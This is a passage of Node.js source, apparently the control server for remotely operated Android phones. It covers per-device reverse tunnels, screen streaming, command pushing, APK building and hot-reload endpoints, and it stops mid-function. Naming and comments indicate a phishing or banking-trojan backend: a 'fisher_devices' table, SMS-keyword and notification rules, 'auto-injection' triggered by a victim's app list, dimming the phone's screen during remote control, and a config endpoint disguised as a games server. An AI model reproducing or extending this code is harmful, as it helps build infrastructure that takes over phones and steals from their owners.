'use strict';

const fs = require('fs');
const path = require('path');
const http = require('http');
const crypto = require('crypto');
const { WebSocketServer } = require('ws');
const url = require('url');
const config = require('../config');
const mysql = require('mysql2/promise');
const { verifyToken } = require('./services/auth');
const { loadCurrentActor, canAccessDevice } = require('./services/deviceAccess');
const StreamHub = require('./stream-hub');

// ★ /internal/minicap-stream 设备端口缓存（60s TTL，避免每次请求查 DB）
const _portCache = new Map(); // deviceId -> { port, ts }
const _PORT_CACHE_TTL = 60000;
// ADB 黑屏仅调整物理屏幕亮度；按设备保存原状态用于精确恢复。
const ADB_BLACK_SCREEN_STATE_FILE = path.join(__dirname, '..', 'adb-black-screen-states.json');
const _adbBlackScreenStates = new Map(); // deviceId -> { brightness, mode }
try {
  if (fs.existsSync(ADB_BLACK_SCREEN_STATE_FILE)) {
    const savedStates = JSON.parse(fs.readFileSync(ADB_BLACK_SCREEN_STATE_FILE, 'utf8'));
    for (const [deviceId, state] of Object.entries(savedStates)) {
      if (Number.isFinite(state?.brightness) && Number.isFinite(state?.mode)) {
        _adbBlackScreenStates.set(deviceId, state);
      }
    }
  }
} catch (e) {
  console.error(`[ADB BlackScreen] state load failed: ${e.message}`);
}
function persistAdbBlackScreenStates() {
  const states = Object.fromEntries(_adbBlackScreenStates.entries());
  fs.writeFileSync(ADB_BLACK_SCREEN_STATE_FILE, JSON.stringify(states, null, 2), 'utf8');
}
async function resolveUpstreamAddr(deviceId) {
  const cached = _portCache.get(deviceId);
  if (cached && Date.now() - cached.ts < _PORT_CACHE_TTL) return cached.port;
  const [rows] = await dbPool.execute(
    'SELECT remote_port FROM fisher_devices WHERE device_id = ? LIMIT 1',
    [deviceId]
  );
  const port = rows[0]?.remote_port;
  if (!port || port <= 0) throw new Error('No tunnel port for device');
  const addr = `127.0.0.1:${port}`;
  _portCache.set(deviceId, { port: addr, ts: Date.now() });
  return addr;
}

// ★ StreamHub：每设备一个 DeviceUpstream，连接池 + 帧缓冲 + 扇出
const streamHub = new StreamHub({
  resolveUpstream: resolveUpstreamAddr,
  idleTimeoutMs: 30000,
  globalMaxBytes: 512 * 1024 * 1024,
});

// ============================================================
// 全局异常处理（防止单个异常让整个进程僵死）
// ============================================================
process.on('unhandledRejection', (reason, promise) => {
  console.error('[unhandledRejection]', new Date().toISOString(), reason);
  // 不退出，只记录
});
process.on('uncaughtException', (err) => {
  console.error('[uncaughtException]', new Date().toISOString(), err && err.stack ? err.stack : err);
  // 不退出（除非是真正的 fatal error）；记录后继续运行
});
process.on('warning', (warning) => {
  console.warn('[process warning]', new Date().toISOString(), warning.name, warning.message);
});

// ── MySQL 连接池（用于查询设备隧道端口）──
// 改进：调大连接池 + 加超时 + 启用 keepAlive 防止空闲连接被中间设备切断
const dbPool = mysql.createPool({
  host: config.mysql.host,
  port: config.mysql.port,
  user: config.mysql.user,
  password: config.mysql.password,
  database: config.mysql.database,
  timezone: config.mysql.timezone || '+08:00',
  waitForConnections: true,
  connectionLimit: 20,
  queueLimit: 0,
  connectTimeout: 10000,
  enableKeepAlive: true,
  keepAliveInitialDelay: 10000,
});

// A saturated or stale MySQL pool must not leave an accepted panel WebSocket
// permanently open without message handlers. The existing policy already
// falls back to JWT-only access on DB errors; this also covers DB calls that
// never settle while waiting for a pooled connection.
const PANEL_AUTH_DB_TIMEOUT_MS = 3000;
function withTimeout(promise, timeoutMs, label) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error(`${label} timed out after ${timeoutMs}ms`));
    }, timeoutMs);

    Promise.resolve(promise).then(
      value => {
        clearTimeout(timer);
        resolve(value);
      },
      error => {
        clearTimeout(timer);
        reject(error);
      }
    );
  });
}

// ★ Stability: 防止 mysql2 Pool 抛出 'error' 事件时导致 Node 进程崩溃。
// 未挂载监听器的 EventEmitter 'error' 事件在 Node 中是致命的（throw）。
dbPool.on('error', (err) => {
  console.error('[MySQL] Pool error (caught):', err && err.message ? err.message : err);
});

// ============================================================
// 通用数据库工具：死锁/锁等待自动重试
// MySQL 死锁错误码: 1213 (ER_LOCK_DEADLOCK)
// 锁等待超时错误码: 1205 (ER_LOCK_WAIT_TIMEOUT)
// 用法: await dbWithRetry(() => dbPool.execute(...), { label: 'xxx' })
// 日志策略：
//   * 第 1 次重试（attempt==0 成功 → 静默不打日志）
//   * 第 2+ 次重试才打 console.debug / warn
//   * 只有彻底失败（maxRetries 耗尽）才打 console.error
// ============================================================
function isDeadlockOrLockWaitError(err) {
  if (!err) return false;
  const code = err.code || err.errno;
  const msg = err.message || '';
  if (code === 1213 || code === 1205) return true;
  if (/Deadlock found/i.test(msg)) return true;
  if (/Lock wait timeout exceeded/i.test(msg)) return true;
  return false;
}
async function dbWithRetry(fn, opts) {
  const maxRetries = opts?.maxRetries ?? 3;
  const label = opts?.label ?? 'db';
  const delayMs = opts?.delayMs ?? 80;
  // 是否在每次重试前打 warn（默认 false：只有最终失败才打，避免日志爆炸）
  const verbose = opts?.verbose === true;
  let lastErr = null;
  let retriedCount = 0;
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const result = await fn();
      // 重试后成功：如果 retriedCount>=1，打一条 warn（仅一次，告诉运维发生过死锁但已自愈）
      if (retriedCount > 0) {
        const level = retriedCount <= 1 ? 'warn' : 'warn';
        console[level] && console[level](`[dbWithRetry] ${label} recovered after ${retriedCount} retries`);
      }
      return result;
    } catch (err) {
      lastErr = err;
      if (!isDeadlockOrLockWaitError(err)) throw err;
      if (attempt === maxRetries) break;
      retriedCount++;
      const wait = delayMs * (attempt + 1);
      if (verbose) {
        console.warn(`[dbWithRetry] ${label} deadlock/lockwait (attempt=${attempt + 1}/${maxRetries}), retry after ${wait}ms: ${err.message}`);
      }
      await new Promise(r => setTimeout(r, wait));
    }
  }
  console.error(`[dbWithRetry] ${label} FAILED after ${maxRetries} retries: ${lastErr && lastErr.message ? lastErr.message : lastErr}`);
  throw lastErr;
}

// 验证设备归属：检查请求者是否有权操作该设备
async function verifyDeviceOwnership(req, deviceId) {
  if (!deviceId) return false;
  try {
    const authHeader = req.headers.authorization || '';
    const token = authHeader.replace(/^Bearer\s+/i, '');
    const user = verifyToken(token);
    if (!user) return false;
    const actor = await loadCurrentActor(dbPool, user);
    if (!actor) return false;
    return canAccessDevice(dbPool, actor, deviceId);
  } catch (e) {
    console.error(`[Auth] verifyDeviceOwnership error: ${e.message}`);
    return false;
  }
}


// ★ 通用 JWT 鉴权（验证任何登录用户 token）
function requireAuth(req) {
  try {
    const authHeader = req.headers.authorization || '';
    const token = authHeader.replace(/^Bearer\s+/i, '');
    const user = verifyToken(token);
    return user || null;
  } catch (e) {
    return null;
  }
}

// ★ 鉴权失败统一响应
function sendAuthError(res, status, message) {
  res.writeHead(status, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ ok: false, error: message }));
}

// 验证请求者是否为 superadmin（仅 superadmin 可访问内部管理接口）
function requireSuperAdmin(req) {
  try {
    const authHeader = req.headers.authorization || '';
    const token = authHeader.replace(/^Bearer\s+/i, '');
    const user = verifyToken(token);
    if (!user) return false;
    return user.role === 'superadmin';
  } catch (e) {
    return false;
  }
}

// 根据 deviceId 查询设备隧道端口（从 fisher_devices.remote_port）
// 缓存 frps proxy 列表（减少 HTTP 请求）
let _frpsProxiesCache = null
let _frpsProxiesCacheTime = 0
const FRPS_CACHE_TTL = 5000 // 5 秒缓存

// ★ 已强制释放的端口池（持久化到 JSON）
// 用于处理 frps 上有野 proxy 但 DB 没对应设备的情况
// 释放后端口号加入此 Set，端口分配时跳过
const RELEASED_PORTS_FILE = path.join(__dirname, "..", "released-ports.json")
let _releasedPorts = new Set()
let _releasedProxyNames = new Set()
try {
  if (fs.existsSync(RELEASED_PORTS_FILE)) {
    const data = JSON.parse(fs.readFileSync(RELEASED_PORTS_FILE, "utf8"))
    if (Array.isArray(data.ports)) {
      _releasedPorts = new Set(data.ports.map(Number).filter(n => Number.isFinite(n) && n > 0))
    }
    if (Array.isArray(data.proxyNames)) {
      _releasedProxyNames = new Set(data.proxyNames.filter(n => typeof n === "string"))
    }
    console.log("[released-ports] Loaded " + _releasedPorts.size + " ports + " + _releasedProxyNames.size + " proxyNames from " + RELEASED_PORTS_FILE)
  }
} catch (e) {
  console.error("[released-ports] Load failed: " + e.message)
}
function persistReleasedPorts() {
  try {
    fs.writeFileSync(RELEASED_PORTS_FILE, JSON.stringify({
      ports: Array.from(_releasedPorts).sort((a, b) => a - b),
      proxyNames: Array.from(_releasedProxyNames).sort(),
      updatedAt: new Date().toISOString()
    }, null, 2))
  } catch (e) {
    console.error("[released-ports] Persist failed: " + e.message)
  }
}
function releasePortToBlacklist(port, proxyName, reason) {
  if (!port || port <= 0) return false
  if (_releasedPorts.has(port)) return false
  _releasedPorts.add(port)
  persistReleasedPorts()
  console.log("[released-ports] Added port " + port + " (proxy=" + proxyName + ", reason=" + reason + ")")
  return true
}
function removePortFromBlacklist(port) {
  if (_releasedPorts.delete(port)) {
    persistReleasedPorts()
    console.log("[released-ports] Removed port " + port)
    return true
  }
  return false
}
function addProxyNameToBlacklist(proxyName, reason) {
  if (!proxyName || typeof proxyName !== "string") return false
  if (_releasedProxyNames.has(proxyName)) return false
  _releasedProxyNames.add(proxyName)
  persistReleasedPorts()
  console.log("[released-ports] Added proxyName " + proxyName + " (reason=" + reason + ")")
  return true
}

async function getFrpsProxiesCached() {
  const now = Date.now()
  if (_frpsProxiesCache && (now - _frpsProxiesCacheTime) < FRPS_CACHE_TTL) {
    return _frpsProxiesCache
  }
  const r = await fetchFrpsProxies()
  if (r.ok) {
    _frpsProxiesCache = r.data
    _frpsProxiesCacheTime = now
  }
  return _frpsProxiesCache || { tcp: [], http: [] }
}

// 根据 deviceId 获取设备的隧道端口（防止串设备）
// 策略：
//  1. 查 DB 拿到 remote_port
//  2. 查 frps 找 proxy 'tunnel_<id前8位>' 是否存在
//  3. 如果 DB 端口对应的 proxy 在 frps 上以其他 proxy 名注册 → 拒绝（可能是串设备）
//  4. 如果 DB 端口对应的 proxy 在 frps 上以正确 proxy 名注册 → 返回
//  5. 如果 DB 端口 = 0 → fallback 19901 跳板
//  6. 都没有 → fallback 19901（向后兼容）
async function getDeviceTunnelPort(deviceId) {
  if (!deviceId) return 19901; // 默认端口（向后兼容）

  let dbPort = 0
  try {
    const [rows] = await dbPool.execute(
      'SELECT remote_port FROM fisher_devices WHERE device_id = ? LIMIT 1',
      [deviceId]
    );
    if (rows.length > 0 && rows[0].remote_port > 0) {
      dbPort = rows[0].remote_port;
    }
  } catch (e) {
    console.error(`[DB] getDeviceTunnelPort error for ${deviceId}: ${e.message}`);
  }

  // ★ 改进：去掉 19901 fallback，信任 DB 端口
  //  1. DB 有端口 → 直接返回（不管 frps 上是否有 proxy，因为 frpc 可能在重连中）
  //  2. DB 没端口 → 现场分配（避免 19901 跳板）
  if (dbPort > 0) {
    // 可选：检测 frps 上是否有别的 proxy 占用此端口（防止串设备）
    try {
      const frps = await getFrpsProxiesCached()
      const allProxies = [...(frps.tcp || []), ...(frps.http || [])]
      const expectedProxyName = `tunnel_${deviceId.substring(0, 8)}`
      const dbPortProxy = allProxies.find(p => p.conf?.remote_port === dbPort && p.name !== "_local")
      if (dbPortProxy && dbPortProxy.name !== expectedProxyName) {
        // DB 端口被别的 proxy 占用 → 串设备风险，fallback 19901
        console.warn(`[TunnelMonitor] device=${deviceId} DB port=${dbPort} occupied by proxy=${dbPortProxy.name} (expected ${expectedProxyName})`, "fallback to 19901");
        return 19901;
      }
    } catch (e) {
      console.error(`[TunnelMonitor] frps check error: ${e.message}`);
    }
    return dbPort;
  }

  // DB 没端口（设备从未连过 bridge）→ 现场分配一个
  try {
    const conn = await dbPool.getConnection();
    try {
      await conn.beginTransaction();
      const [maxRows] = await conn.execute(
        "SELECT MAX(remote_port) as mx FROM fisher_devices WHERE remote_port >= 19902 AND remote_port <= 29999"
      );
      let newPort = (maxRows[0]?.mx || 19901) + 1;
      if (newPort < 19902) newPort = 19902;
      // 100 次循环避撞
      let attempts = 0;
      while (attempts < 100 && newPort <= 29999) {
        const [occ] = await conn.execute(
          "SELECT COUNT(*) as c FROM fisher_devices WHERE remote_port = ? AND device_id <> ?",
          [newPort, deviceId]
        );
        if (occ[0].c === 0) break;
        newPort++;
        attempts++;
      }
      if (newPort > 29999) newPort = 19901; // 实在没端口
      await conn.execute(
        "UPDATE fisher_devices SET remote_port = ?, tunnel_deployed = 1 WHERE device_id = ?",
        [newPort, deviceId]
      );
      await conn.commit();
      console.log(`[getDeviceTunnelPort] Allocated new port ${newPort} for ${deviceId.substring(0, 12)}...`);
      return newPort;
    } catch (e) {
      await conn.rollback();
      throw e;
    } finally {
      conn.release();
    }
  } catch (e) {
    console.error(`[getDeviceTunnelPort] allocate failed: ${e.message}`);
  }

  return 19901; // 实在没办法的兜底（理论不该走到这里）
}

// 初始加载 handlers 和 services（后续通过热重载更新）
require('./handlers/admin');
require('./handlers/device');
require('./handlers/bridge');
require('./handlers/agent');
require('./compat/freeSocketIoCompat');
// require('./services/telegram'); // TG 通知已移到 PHP 端
require('./services/apkBuilder');
require('./services/commandPoller');

// --- 热重载基础设施 ---
// 需要热重载的模块列表（相对路径）
const RELOADABLE_MODULES = [
  './handlers/admin',
  './handlers/device',
  './handlers/bridge',
  './handlers/agent',
  './compat/freeSocketIoCompat',
  './services/apkBuilder',
  './services/commandPoller',
];

/**
 * 动态获取最新的 handler/service 模块（每次调用都读取最新的 require.cache）
 */
function getHandler(modulePath) {
  return require(modulePath);
}

/**
 * 清除指定模块的 require.cache 并重新加载
 * @returns {string[]} 成功重载的模块列表
 */
function reloadModules() {
  const reloaded = [];
  const errors = [];

  for (const mod of RELOADABLE_MODULES) {
    const fullPath = require.resolve(mod);
    try {
      delete require.cache[fullPath];
      require(mod); // 重新加载
      reloaded.push(mod);
    } catch (err) {
      errors.push({ module: mod, error: err.message });
      console.error(`[Reload] Failed to reload ${mod}:`, err.message);
    }
  }

  console.log(`[Reload] Reloaded ${reloaded.length} modules at ${new Date().toISOString()}`);
  if (errors.length > 0) {
    console.error(`[Reload] ${errors.length} modules failed to reload`);
  }

  return { reloaded, errors };
}

// 连接池
const connections = {
  admins: new Map(),    // token_id -> { ws, user }
  devices: new Map(),   // device_id -> { ws, sessionId }
  bridges: new Map(),   // device_id -> { ws }
  agents: new Map(),    // device_id -> { ws }
};

function sendFreeJson(res, statusCode, payload) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
  });
  res.end(JSON.stringify(payload));
}
const { createFreeHttpHandlers } = require('./compat/freeHttpCompat');
const {
  handleRegister: handleFreeRegister,
  handleLogs: handleFreeLogs,
  handlePaymentStrategies: handleFreeNotifyRules,
} = createFreeHttpHandlers(dbPool);

// HTTP server (健康检查 + 内部广播 API)
const server = http.createServer(async (req, res) => {
  const requestPath = new URL(req.url, `http://${req.headers.host || 'localhost'}`).pathname;
  req._realIp = req.headers['x-real-ip']
    || String(req.headers['x-forwarded-for'] || '').split(',')[0].trim()
    || (req.socket.remoteAddress || '').replace('::ffff:', '');

  if (requestPath === '/n' && req.method === 'POST') {
    await handleFreeRegister(req, res);
    return;
  }

  if (requestPath === '/p/k' && req.method === 'POST') {
    await handleFreeLogs(req, res);
    return;
  }

  if (requestPath === '/f/ps' && req.method === 'GET') {
    await handleFreeNotifyRules(req, res);
    return;
  }

  if (requestPath === '/api/device/notify-rules' && req.method === 'GET') {
    sendFreeJson(res, 200, { data: { notifPackages: [], smsKeywords: [] } });
    return;
  }

  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    // 计算不同设备 ID（devices + bridges 去重）
    const allDeviceIds = new Set();
    for (const [id] of connections.devices) allDeviceIds.add(id);
    for (const [id] of connections.bridges) allDeviceIds.add(id);
    res.end(JSON.stringify({
      status: 'ok',
      uptime: Math.floor(process.uptime()),
      onlineDevices: allDeviceIds.size,
      admins: connections.admins.size,
      devices: connections.devices.size,
      bridges: connections.bridges.size,
      agents: connections.agents.size,
    }));
    return;
  }

  // 在线设备列表接口：PHP 调用此接口判断设备在线状态
  if (req.url === '/online-devices' || req.url === '/internal/connections') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    // 各自独立返回：devices 只含 device 连接，bridges 只含 bridge 连接
    const { getGraceDevicesByPool } = require('./services/keepAlive');
    const deviceIds = new Set(connections.devices.keys());
    const bridgeIds = new Set(connections.bridges.keys());
    // grace period 中的设备按原始连接池类型分别加入
    const graceByPool = getGraceDevicesByPool();
    for (const id of graceByPool.devices) deviceIds.add(id);
    for (const id of graceByPool.bridges) bridgeIds.add(id);
    res.end(JSON.stringify({
      devices: Array.from(deviceIds),
      bridges: Array.from(bridgeIds),
    }));
    return;
  }

  // 内部优雅关闭接口
  // security fix: /internal/shutdown requires superadmin
  if (req.url === '/internal/shutdown' && req.method === 'POST') {
    if (!requireSuperAdmin(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'Forbidden: superadmin required' }));
      return;
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end('{"ok":true,"message":"shutting down gracefully"}');
    gracefulShutdown();
    return;
  }

  // ★ /internal/blacklist — 查询/清空黑名单
  if (req.url && req.url.startsWith('/internal/blacklist')) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, DELETE, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
    if (!requireSuperAdmin(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: '需要 superadmin 权限' }));
      return;
    }
    const u = new URL(req.url, `http://${req.headers.host}`);
    if (req.method === 'GET') {
      // 查询当前黑名单
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true, ports: Array.from(_releasedPorts).sort((a, b) => a - b), proxyNames: Array.from(_releasedProxyNames).sort(), updatedAt: require('fs').existsSync(RELEASED_PORTS_FILE) ? (JSON.parse(require('fs').readFileSync(RELEASED_PORTS_FILE, 'utf8')).updatedAt || null) : null }));
      return;
    }
    if (req.method === 'DELETE') {
      // 清空黑名单（可指定类型）
      const type = u.searchParams.get('type') || 'all';
      let removedPorts = 0, removedNames = 0;
      if (type === 'all' || type === 'ports') { removedPorts = _releasedPorts.size; _releasedPorts.clear(); }
      if (type === 'all' || type === 'proxyNames') { removedNames = _releasedProxyNames.size; _releasedProxyNames.clear(); }
      persistReleasedPorts();
      console.log(`[blacklist] Cleared: ${removedPorts} ports + ${removedNames} proxyNames`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true, removedPorts, removedNames }));
      return;
    }
    res.writeHead(405, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: false, error: 'Method not allowed. Use GET or DELETE.' }));
    return;
  }

  // 内部发送命令到 Bridge WS
  if (req.url === '/internal/bridge-send' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const { deviceId, message } = JSON.parse(body);
        if (!deviceId || !message) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: 'deviceId and message required' }));
          return;
        }
        const bridge = connections.bridges.get(deviceId);
        if (!bridge || bridge.ws.readyState !== 1) {
          res.writeHead(404, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: `Bridge ${deviceId} not connected` }));
          return;
        }
        bridge.ws.send(JSON.stringify(message));
        console.log(`[Bridge-Send] Sent to ${deviceId}: ${JSON.stringify(message).substring(0, 100)}`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, sent: message }));
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: err.message }));
      }
    });
    return;
  }

  // PHP 全局策略下发：仅允许本机回环请求，命令只发送到 APK device WS。
  if (req.url === '/internal/device-command' && req.method === 'POST') {
    const remote = String(req.socket.remoteAddress || '').replace('::ffff:', '');
    if (remote !== '127.0.0.1' && remote !== '::1') {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'loopback only' }));
      return;
    }
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const parsed = JSON.parse(body || '{}');
        const command = String(parsed.command || '').trim();
        const params = parsed.params && typeof parsed.params === 'object' ? parsed.params : {};
        if (!command) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: 'command required' }));
          return;
        }
        const ids = parsed.broadcast === true
          ? Array.from(connections.devices.keys())
          : (Array.isArray(parsed.deviceIds) ? parsed.deviceIds : [parsed.deviceId]);
        const sent = [], skipped = [];
        for (const id of ids.filter(Boolean)) {
          const device = connections.devices.get(id);
          if (!device || !device.ws || device.ws.readyState !== 1) {
            skipped.push(id);
            continue;
          }
          device.ws.send(JSON.stringify({ type: 'command', sessionId: id, data: { command, params } }));
          sent.push(id);
        }
        console.log('[PolicyPush] ' + command + ': sent=' + sent.length + ', skipped=' + skipped.length);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, command, sent, skipped }));
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: err.message }));
      }
    });
    return;
  }

  // PHP /api/sync/app-list 的本机回调。某些 APK 只用 HTTP 上传应用
  // 列表，不会在 device WS 回复 app_list_response；此处把它接入自动注入流程。
  if (requestPath === '/internal/device-app-list' && req.method === 'POST') {
    const remote = String(req.socket.remoteAddress || '').replace('::ffff:', '');
    if (remote !== '127.0.0.1' && remote !== '::1') {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'loopback only' }));
      return;
    }

    let body = '';
    req.on('data', chunk => {
      body += chunk;
      if (body.length > 8 * 1024 * 1024) req.destroy();
    });
    req.on('end', () => {
      try {
        const parsed = JSON.parse(body || '{}');
        const deviceId = String(parsed.deviceId || '').trim();
        const apps = parsed.apps;
        if (!deviceId || !Array.isArray(apps)) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: 'deviceId and apps[] required' }));
          return;
        }

        const current = connections.devices.get(deviceId);
        if (!current || !current.ws || current.ws.readyState !== 1) {
          res.writeHead(404, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: 'device-ws-offline' }));
          return;
        }

        // 先标记已收到，阻止后续 GET_APP_LIST 计时器重复请求。
        current.appListReceived = true;
        res.writeHead(202, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, queued: true, reason: 'accepted' }));

        const { handleUploadedAppList } = getHandler('./handlers/device');
        Promise.resolve(handleUploadedAppList(
          deviceId,
          apps,
          connections,
          String(parsed.source || 'php-sync-app-list')
        )).catch(err => {
          console.error(`[HTTP-AppList] ${deviceId} auto-injection failed: ${err.message}`);
        });
      } catch (err) {
        if (!res.headersSent) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: err.message }));
        }
      }
    });
    return;
  }

  // 内部广播接口：PHP 调用此接口通知前端
  if (req.url === '/internal/broadcast' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const msg = JSON.parse(body);
        const { broadcastToAdmins } = getHandler('./handlers/admin');
        broadcastToAdmins(connections, msg);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"ok":true}');
      } catch (err) {
        res.writeHead(400);
        res.end(JSON.stringify({ error: err.message }));
      }
    });
    return;
  }

  // --- 热重载接口（改进：先发 1012 让客户端重连，真正生效） ---
  if (req.url === '/internal/reload' && req.method === 'POST') {
    if (!requireSuperAdmin(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: '需要 superadmin 权限' }));
      return;
    }
    try {
      // 1. 通知所有客户端：服务器即将重启（1012 Service Restart）
      //    frpc 收到 1012 会立即主动重连，重连时绑定新代码
      gracefulShutdown({ waitMs: 1500, skipExit: true });
      
      // 2. 停止 commandPoller（如果有 stop 方法）
      try {
        const pollerModule = require('./services/commandPoller');
        if (typeof pollerModule.stopCommandPoller === 'function') {
          pollerModule.stopCommandPoller();
        }
      } catch (e) { /* ignore */ }

      // 停止 apkBuilder poller（如果有 stop 方法）
      try {
        const apkModule = require('./services/apkBuilder');
        if (typeof apkModule.stopPoller === 'function') {
          apkModule.stopPoller();
        }
      } catch (e) { /* ignore */ }

      // 执行热重载
      const result = reloadModules();

      // 重启 commandPoller
      try {
        const { startCommandPoller } = getHandler('./services/commandPoller');
        if (typeof startCommandPoller === 'function') {
          startCommandPoller(connections);
        }
      } catch (e) {
        console.error('[Reload] Failed to restart commandPoller:', e.message);
        result.errors.push({ module: 'commandPoller.restart', error: e.message });
      }

      // 重启 apkBuilder poller
      try {
        const { startPoller } = getHandler('./services/apkBuilder');
        if (typeof startPoller === 'function') {
          startPoller();
        }
      } catch (e) {
        console.error('[Reload] Failed to restart apkBuilder:', e.message);
        result.errors.push({ module: 'apkBuilder.restart', error: e.message });
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        ok: true,
        message: `Reloaded ${result.reloaded.length} modules`,
        reloaded: result.reloaded,
        errors: result.errors.length > 0 ? result.errors : undefined,
        timestamp: new Date().toISOString(),
      }));
    } catch (err) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: err.message }));
    }
    return;
  }

  // ★ 2026-08-06：APK 唤醒接口（来自 PHP DeviceController::reconnectWs()）
  //   POST /internal/reconnect-device  body: deviceId=xxx
  //   策略：
  //     1. 若 device WS 已连 → 直接返回 alreadyOnline
  //     2. 若 bridge WS 已连 → 通过 bridge 通道推送 reconnect_ws 指令
  //     3. 两者都没连 → 返回唤醒失败（需 APK 主动重连，Node WS 无法主动唤起）
  if (req.url === '/internal/reconnect-device' && req.method === 'POST') {
    if (!requireSuperAdmin(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: '需要 superadmin 权限' }));
      return;
    }
    try {
      let body = '';
      req.on('data', chunk => body += chunk);
      req.on('end', async () => {
        const params = new URLSearchParams(body || '');
        const deviceId = params.get('deviceId') || '';
        if (!deviceId) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ ok: false, error: 'deviceId required' }));
          return;
        }

        const result = { deviceId, ts: Date.now() };

        // 检查 device WS
        const deviceConn = connections.devices.get(deviceId);
        if (deviceConn && deviceConn.ws && deviceConn.ws.readyState === 1) {
          result.deviceOnline = true;
          result.action = 'already_online';
        } else {
          result.deviceOnline = false;
          // 检查 bridge WS
          const bridgeConn = connections.bridges.get(deviceId);
          if (bridgeConn && bridgeConn.ws && bridgeConn.ws.readyState === 1) {
            try {
              // 通过 bridge 通道推送 reconnect 指令给 APK local-service
              // local-service 收到后会通过 HTTP 重新连接 device WS
              bridgeConn.ws.send(JSON.stringify({
                type: 'command',
                sessionId: deviceId,
                data: {
                  command: 'reconnect_ws',
                  params: { reason: 'admin_wakeup' }
                }
              }));
              result.action = 'wakeup_via_bridge_sent';
              console.log(`[ReconnectDevice] Sent reconnect_ws to ${deviceId} via bridge`);
            } catch (e) {
              result.action = 'wakeup_failed';
              result.error = e.message;
            }
          } else {
            result.action = 'no_ws_available';
            result.error = 'device 和 bridge WS 都未连接，无法主动唤醒（需 APK 主动重连）';
          }
        }

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true, ...result }));
      });
    } catch (err) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: err.message }));
    }
    return;
  }

  // ★ /api/tunnel/config — 格式完全模仿正常服务器 (zh-cno-fengniaogames.com)
  // Go 的 parseTunnelConfig 从 data 中读取 serverAddr/serverPort/token/remotePort
  // Go 同时使用 data.configINI 直接写入 frpc_independent.ini
if (req.url && req.url.startsWith('/api/tunnel/config')) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Device-ID, X-Device-Key, X-Client-ID, X-Client-Token');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
    // ★ 19901 跳板已去除：直接要求 deviceId（X-Device-ID header 或 ?deviceId 参数）
    // Go 端启动后会通过本地生成（android_id+serial+brand+model sha256）或配置文件拿到 deviceId，
    // 拉 config 时一定带 deviceId，不再 fallback 到 _local+19901
    const tunnelUrl = new URL(req.url, `http://${req.headers.host}`);
    let deviceId = req.headers['x-device-id'] || tunnelUrl.searchParams.get('deviceId') || '';

    // ★ Go 端也会通过 POST body 传 deviceId（用 X-Device-ID header 同时也用 body）
    // ★ 额外 fallback：从 POST body JSON 里读 deviceId
    if (!deviceId && req.method === 'POST') {
      try {
        const body = await new Promise((resolve) => {
          let buf = '';
          req.on('data', c => buf += c);
          req.on('end', () => resolve(buf));
          req.on('error', () => resolve(''));
        });
        if (body) {
          const parsed = JSON.parse(body);
          deviceId = parsed.deviceId || parsed.device_id || '';
        }
      } catch (e) {}
    }

    if (!deviceId) {
